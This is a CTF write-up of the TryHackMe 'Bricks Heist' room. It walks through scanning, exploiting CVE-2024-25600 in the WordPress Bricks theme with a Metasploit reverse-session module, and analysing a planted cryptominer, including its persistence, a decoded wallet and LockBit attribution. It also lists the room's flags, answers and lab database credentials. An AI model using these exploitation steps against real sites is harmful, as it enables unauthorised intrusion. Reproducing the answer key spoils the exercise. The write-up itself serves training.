# 🧱 TryHackMe: Bricks Heist - CTF Write-up

## 📝 Overview
> **Room:** Bricks Heist
> **Difficulty:** Easy 🟢
> **Topics:** Web Exploitation, CVE-2024-25600, Incident Response, Malware Forensic Analysis, Threat Attribution.

**Scenario:** We are tasked with investigating a compromised web server...
---
<br><br>


## 🔍 Phase 1: Reconnaissance & Enumeration

### 1. Port Scanning (Nmap)
We initiate the investigation with an Nmap scan to map the external attack surface.

```bash
nmap -sC -sV MACHINE_IP bricks

```

**Output Snippet:**

```text
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) 
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Python http.server 3.5 - 3.10
443/tcp  open  ssl/http Apache httpd
3306/tcp open  mysql    MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

The scan reveals an Apache web server on port 443. Investigating the web application indicates it is running WordPress.

### 2. Web Vulnerability Scanning (Metasploit)

Knowing the target runs WordPress, we utilize Metasploit's `wordpress_scanner` auxiliary module to enumerate installed themes, plugins, and users.

```bash
msfconsole
msf6 > use auxiliary/scanner/http/wordpress_scanner
msf6 > set RHOSTS bricks.thm
msf6 > set SSL true
msf6 > set RPORT 443
msf6 > run

```

**Output Snippet:**

```text
[*] Trying MACHINE_IP bricks
[+] MACHINE_IP bricks - Detected Wordpress 6.5
[+] MACHINE_IP bricks - Detected theme: bricks version 5.4
[+] MACHINE_IP bricks - Detected user: administrator with username: administrator
[*] Scanned 1 of 1 hosts (100% complete)

```

**Key Discovery:** The site is running **WordPress 6.5** with the **Bricks theme version 5.4**.

---

## 🚪 Phase 2: Exploitation & Initial Access

Researching the specific theme version (Bricks 5.4) reveals a critical Unauthenticated Remote Code Execution (RCE) vulnerability: **CVE-2024-25600**. This exploit leverages a "nonce" leakage and the `eval()` function in PHP.

We load the corresponding exploit module in Metasploit to gain a foothold on the server.

```bash
msf6 > use exploit/multi/http/wp_bricks_builder_rce
msf6 > set RHOSTS MACHINE_IP bricks
msf6 > set LHOST [Your_Local_IP]
msf6 > set VHOST bricks.thm
msf6 > set SSL true
msf6 > set RPORT 443
msf6 > exploit

```

**Result:** The exploit successfully executes, granting us a Meterpreter session as the `apache` user. We can now begin the forensic investigation.

---

## 🕵️ Phase 3: Post-Exploitation & Forensic Analysis

With our foothold established, we navigate the file system to answer the incident response objectives.

### Objective 1: Locate the hidden web flag

While exploring the web directory (`/data/www/default`), we locate a text file disguised with an MD5 hash as its filename.

```bash
meterpreter > cat 650c844110baced87e1606453b93f22a.txt

```

> **Answer:** `THM{fl46_650c844110baced87e1606453b93f22a}`

*(Note: During enumeration, we also audited `wp-config.php` and uncovered the database credentials `root:lamp.sh`).*

### Objective 2: Identify the suspicious process

The server shows signs of resource exhaustion, typical of a cryptominer infection. We check the running processes looking for anomalies running as `root`:

```bash
meterpreter > ps

```

We spot a highly suspicious process running out of the NetworkManager directory:
`2796  /lib/NetworkManager/nm-inet-dialog  root`

> **Answer:** `nm-inet-dialog`

### Objective 3: Identify the affiliated service name

Threat actors frequently use `systemd` services to maintain persistence. We inspect the `/etc/systemd/system/` directory to see how the malware survives reboots.

```bash
meterpreter > cat /etc/systemd/system/ubuntu.service

```

The `ExecStart` parameter points directly to `/lib/NetworkManager/nm-inet-dialog`.

> **Answer:** `ubuntu.service`

### Objective 4: Determine the miner's log file name

To understand the malware's behavior, we analyze its configuration rules located in `/etc/badr/room.rules.yaml`. The EDR rules reveal that the miner is masquerading its logs as a standard network configuration file to avoid detection.

> **Answer:** `inet.conf`

### Objective 5: Extract the wallet address

We navigate to the directory hosting the suspicious process to look for its configuration or log outputs. We read the `inet.conf` file:

```bash
meterpreter > cat /lib/NetworkManager/inet.conf

```

This outputs a long hex-encoded ID string:
`ID: 5757314e65474e5962484a4f656d787457544e424e57464855544668...` *(truncated)*

We extract it and decode it locally on our machine using a double-decode method (Hex ➔ Base64 ➔ Plaintext):

```bash
echo "[HEX_STRING]" | xxd -r -p | base64 -d | base64 -d

```

This reveals the attacker's Bitcoin address.

> **Answer:** `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`

### Objective 6: Threat Attribution

We cross-reference the extracted Bitcoin wallet address using Open-Source Intelligence (OSINT). The address is a known Indicator of Compromise (IoC) linked to a major Ransomware-as-a-Service (RaaS) operation.

> **Answer:** `LockBit`

---

## 🏁 Investigation Summary

| TryHackMe Prompt | Verified Answer |
| --- | --- |
| **Content of the hidden .txt file** | `THM{fl46_650c844110baced87e1606453b93f22a}` |
| **Name of the suspicious process** | `nm-inet-dialog` |
| **Service name affiliated with process** | `ubuntu.service` |
| **Log file name of the miner** | `inet.conf` |
| **Wallet address of the miner** | `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa` |
| **Threat Group affiliation** | `LockBit` |

